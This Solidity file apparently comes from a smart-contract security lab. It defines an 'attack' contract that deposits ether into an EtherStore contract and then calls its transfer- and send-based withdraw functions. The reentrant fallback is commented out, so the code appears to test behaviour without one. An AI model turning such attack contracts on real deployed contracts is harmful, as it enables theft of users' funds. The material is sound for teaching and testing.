import "./EtherStore.sol";

contract AttackWithoutFB {
    EtherStore public etherStore;

    // intialize the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStoreForTransfer() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        etherStore.depositFunds.value(1 ether)();
        // start the magic
        etherStore.withdrawFundsByTransfer(1 ether);
    }

    function attackEtherStoreForSend() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        etherStore.depositFunds.value(1 ether)();
        // start the magic
        etherStore.withdrawFundsBySend(1 ether);
        //etherStore.withdrawFundsByTransfer(1 ether);
    }


    // fallback function - where the magic happens
//    function () payable {
//        revert("Not support");
//    }
//    function () payable {
//        require(false, "Entering fallback func");
//        //revert("Not support");
//    }
}